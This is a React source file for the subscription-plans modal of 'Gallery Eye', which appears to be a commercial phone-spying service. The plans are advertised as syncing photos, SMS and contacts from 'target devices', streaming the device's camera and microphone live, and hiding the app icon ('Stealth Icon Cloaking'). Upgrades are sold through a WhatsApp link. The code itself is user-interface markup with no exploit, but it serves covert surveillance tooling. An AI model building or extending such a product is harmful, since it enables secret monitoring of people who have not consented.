"use client";

import React from 'react';
import { 
    Check, X, Shield, Zap, Crown, Star, Camera, Mic, 
    MessageSquare, Users, Bell, Flashlight, Vibrate, 
    Download, EyeOff, Smartphone, Building2, Sparkles, ArrowRight
} from 'lucide-react';

interface PlansModalProps {
    isOpen: boolean;
    onClose: () => void;
    currentPlan: 'basic' | 'standard' | 'premium' | 'enterprise';
    userEmail: string;
    userUuid: string;
}

export default function PlansModal({ isOpen, onClose, currentPlan, userEmail, userUuid }: PlansModalProps) {
    if (!isOpen) return null;

    const getWhatsAppLink = (planName: string, price: string) => {
        const msg = `🔐 *Gallery Eye — Plan Upgrade*\n\n📧 Email: ${userEmail}\n🆔 UUID: ${userUuid}\n📋 Plan: ${planName} (${price})\n\nI'd like to upgrade to the ${planName} plan. Please process my request! 🙏✨`;
        return `https://wa.me/923460257488?text=${encodeURIComponent(msg)}`;
    };

    const plans = [
        {
            id: 'basic',
            name: 'Free Starter',
            price: '$0',
            period: 'forever',
            theme: 'slate',
            accent: '#94a3b8',
            glowColor: 'rgba(148,163,184,0.15)',
            icon: Shield,
            badge: null,
            features: [
                { text: '50 Photos Sync Limit', included: true },
                { text: '1 Target Device', included: true },
                { text: 'Basic Gallery Viewer', included: true },
                { text: 'Live Video Sync', included: false },
                { text: 'SMS & Contacts Tracker', included: false },
                { text: 'Notification Monitor', included: false },
                { text: 'Camera & Mic Stream', included: false },
                { text: 'Stealth Icon Cloaking', included: false },
            ],
        },
        {
            id: 'standard',
            name: 'Standard Pro',
            price: '$5',
            period: '/ year',
            theme: 'emerald',
            accent: '#10b981',
            glowColor: 'rgba(16,185,129,0.25)',
            icon: Zap,
            badge: 'POPULAR',
            badgeClass: 'bg-emerald-500 text-black font-black',
            features: [
                { text: 'Unlimited Photos & Videos', included: true },
                { text: 'Up to 5 Devices', included: true },
                { text: 'SMS & Contacts Sync', included: true },
                { text: 'Notification Monitor', included: true },
                { text: 'Torch & Vibration Pulse', included: true },
                { text: 'ZIP Bulk Downloader', included: true },
                { text: 'Camera & Mic Stream', included: false },
                { text: 'Stealth Icon Cloaking', included: false },
            ],
        },
        {
            id: 'premium',
            name: 'Premium Elite',
            price: '$10',
            period: '/ year',
            theme: 'amber',
            accent: '#f59e0b',
            glowColor: 'rgba(245,158,11,0.3)',
            icon: Crown,
            badge: 'ALL ACCESS',
            badgeClass: 'bg-amber-400 text-black font-black shadow-[0_0_12px_rgba(245,158,11,0.6)]',
            features: [
                { text: 'Everything in Standard', included: true },
                { text: 'Up to 10 Devices', included: true },
                { text: 'Live Camera Streaming', included: true },
                { text: 'Live Mic Audio Stream', included: true },
                { text: 'Stealth Icon Cloaking', included: true },
                { text: 'All Tools & Actions Unlocked', included: true },
                { text: 'Instant Telemetry Sync', included: true },
                { text: 'Priority WhatsApp VIP Desk', included: true },
            ],
        },
        {
            id: 'enterprise',
            name: 'Enterprise VIP',
            price: 'Custom',
            period: 'custom SLA',
            theme: 'purple',
            accent: '#a855f7',
            glowColor: 'rgba(168,85,247,0.35)',
            icon: Building2,
            badge: 'UNLIMITED',
            badgeClass: 'bg-purple-500 text-white font-black shadow-[0_0_12px_rgba(168,85,247,0.6)]',
            features: [
                { text: 'Everything in Premium', included: true },
                { text: 'Unlimited Target Devices', included: true },
                { text: 'Maximum Bandwidth & Speed', included: true },
                { text: 'Unlimited Cloud Storage', included: true },
                { text: 'Custom Domain / Whitelabel', included: true },
                { text: 'Full Audio & Video Suite', included: true },
                { text: '24/7 Dedicated Support', included: true },
                { text: 'Custom Android APK Builds', included: true },
            ],
        },
    ];

    return (
        <div 
            className="fixed inset-0 z-[600] flex items-center justify-center p-3 sm:p-5 bg-black/85 backdrop-blur-xl animate-in fade-in duration-100"
            onClick={onClose}
        >
            <div 
                className="relative w-full max-w-5xl bg-[#0f1115] border border-white/15 rounded-3xl sm:rounded-[2.5rem] shadow-[0_30px_90px_rgba(0,0,0,0.98)] max-h-[92vh] flex flex-col overflow-hidden animate-in zoom-in-95 duration-100"
                onClick={(e) => e.stopPropagation()}
            >
                {/* Header Bar */}
                <div className="p-4 sm:p-6 pb-3 sm:pb-4 border-b border-white/10 flex items-center justify-between bg-black/40 shrink-0">
                    <div className="flex items-center gap-3">
                        <div className="clay-icon-pod w-10 h-10 rounded-2xl flex items-center justify-center text-orange-400">
                            <Sparkles size={20} />
                        </div>
                        <div>
                            <h2 className="text-base sm:text-xl font-black text-white tracking-tight flex items-center gap-2">
                                <span>Subscription Tiers</span>
                            </h2>
                            <p className="text-[11px] sm:text-xs text-white/40 font-mono">Unlock advanced surveillance & multi-device power</p>
                        </div>
                    </div>
                    <button
                        type="button"
                        onClick={onClose}
                        className="clay-button-sm w-9 h-9 rounded-xl flex items-center justify-center text-white/60 hover:text-white transition-all cursor-pointer"
                        title="Close"
                    >
                        <X size={16} />
                    </button>
                </div>

                {/* Scrollable Content */}
                <div className="overflow-y-auto p-4 sm:p-6 custom-scrollbar space-y-5">
                    <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5 sm:gap-4">
                        {plans.map((plan) => {
                            const isActive = currentPlan === plan.id;
                            const isPremium = plan.id === 'premium';
                            const isEnterprise = plan.id === 'enterprise';
                            const isStandard = plan.id === 'standard';
                            const IconComponent = plan.icon;

                            const canUpgrade = !isActive && (
                                (plan.id === 'standard' && currentPlan === 'basic') ||
                                (plan.id === 'premium' && (currentPlan === 'basic' || currentPlan === 'standard')) ||
                                (plan.id === 'enterprise' && (currentPlan === 'basic' || currentPlan === 'standard' || currentPlan === 'premium'))
                            );

                            return (
                                <div
                                    key={plan.id}
                                    className={`relative rounded-3xl p-4 sm:p-5 flex flex-col justify-between transition-all ${
                                        isActive
                                            ? 'bg-[#161920] border-2 border-orange-500/80 shadow-[0_0_25px_rgba(249,115,22,0.25)]'
                                            : isEnterprise
                                                ? 'bg-[#14121a] border border-purple-500/30 hover:border-purple-500/60 shadow-[0_10px_30px_rgba(0,0,0,0.5)]'
                                                : isPremium
                                                    ? 'bg-[#171512] border border-amber-500/30 hover:border-amber-500/60 shadow-[0_10px_30px_rgba(0,0,0,0.5)]'
                                                    : isStandard
                                                        ? 'bg-[#111714] border border-emerald-500/30 hover:border-emerald-500/60 shadow-[0_10px_30px_rgba(0,0,0,0.5)]'
                                                        : 'bg-[#13151a] border border-white/10 hover:border-white/20'
                                    }`}
                                >
                                    {/* Badge Top */}
                                    {plan.badge && (
                                        <div className="absolute -top-2.5 right-4">
                                            <span className={`px-2.5 py-0.5 rounded-full text-[9px] font-mono font-black uppercase tracking-wider ${plan.badgeClass}`}>
                                                {plan.badge}
                                            </span>
                                        </div>
                                    )}

                                    <div>
                                        {/* Plan Icon + Titles */}
                                        <div className="flex items-center gap-3 mb-3">
                                            <div 
                                                className="w-10 h-10 rounded-2xl flex items-center justify-center border shrink-0"
                                                style={{
                                                    background: `${plan.accent}15`,
                                                    borderColor: `${plan.accent}40`,
                                                    color: plan.accent,
                                                }}
                                            >
                                                <IconComponent size={20} />
                                            </div>
                                            <div className="min-w-0">
                                                <div className="text-xs font-black text-white truncate">{plan.name}</div>
                                                <div className="flex items-baseline gap-1 mt-0.5">
                                                    <span className="text-lg font-black text-white font-mono">{plan.price}</span>
                                                    <span className="text-[10px] text-white/40 font-mono">{plan.period}</span>
                                                </div>
                                            </div>
                                        </div>

                                        {/* Current Plan Indicator */}
                                        {isActive && (
                                            <div className="mb-3 py-1 px-2 rounded-xl text-center text-[10px] font-mono font-black uppercase tracking-wider bg-orange-500/15 border border-orange-500/40 text-orange-300">
                                                Active Plan
                                            </div>
                                        )}

                                        <div className="w-full h-px bg-white/10 mb-3" />

                                        {/* Features List */}
                                        <div className="space-y-2 mb-4">
                                            {plan.features.map((f, i) => (
                                                <div key={i} className="flex items-center gap-2">
                                                    <div 
                                                        className={`w-4 h-4 rounded-full flex items-center justify-center shrink-0 ${
                                                            f.included 
                                                                ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30' 
                                                                : 'bg-white/5 text-white/20 border border-white/5'
                                                        }`}
                                                    >
                                                        {f.included ? <Check size={10} strokeWidth={3} /> : <X size={9} strokeWidth={2} />}
                                                    </div>
                                                    <span className={`text-[11px] leading-tight font-medium ${f.included ? 'text-zinc-200' : 'text-zinc-500 line-through'}`}>
                                                        {f.text}
                                                    </span>
                                                </div>
                                            ))}
                                        </div>
                                    </div>

                                    {/* Action Button */}
                                    <div className="pt-2">
                                        {canUpgrade ? (
                                            <a
                                                href={getWhatsAppLink(plan.name, `${plan.price} ${plan.period}`)}
                                                target="_blank"
                                                rel="noopener noreferrer"
                                                className={`w-full py-2.5 rounded-xl font-mono font-black text-xs uppercase tracking-wider flex items-center justify-center gap-1.5 transition-all shadow-md active:scale-95 cursor-pointer ${
                                                    isEnterprise
                                                        ? 'bg-purple-600 hover:bg-purple-500 text-white shadow-[0_0_15px_rgba(168,85,247,0.4)]'
                                                        : isPremium
                                                            ? 'bg-amber-400 hover:bg-amber-300 text-black shadow-[0_0_15px_rgba(245,158,11,0.5)]'
                                                            : 'bg-emerald-500 hover:bg-emerald-400 text-black shadow-[0_0_15px_rgba(16,185,129,0.4)]'
                                                }`}
                                            >
                                                <span>Upgrade Plan</span>
                                                <ArrowRight size={13} />
                                            </a>
                                        ) : isActive ? (
                                            <div className="py-2.5 rounded-xl bg-white/5 border border-white/10 text-center text-[10px] font-mono font-bold text-white/40">
                                                Currently Active
                                            </div>
                                        ) : (
                                            <div className="py-2.5 rounded-xl bg-white/5 border border-white/10 text-center text-[10px] font-mono font-bold text-white/30">
                                                Included in Tier
                                            </div>
                                        )}
                                    </div>
                                </div>
                            );
                        })}
                    </div>

                    {/* Footer Info */}
                    <div className="bg-[#13151a] border border-white/10 rounded-2xl p-3 text-center">
                        <p className="text-[11px] font-mono text-white/50">
                            Instant manual activation via encrypted WhatsApp channel • Dedicated 24/7 support
                        </p>
                    </div>
                </div>
            </div>
        </div>
    );
}
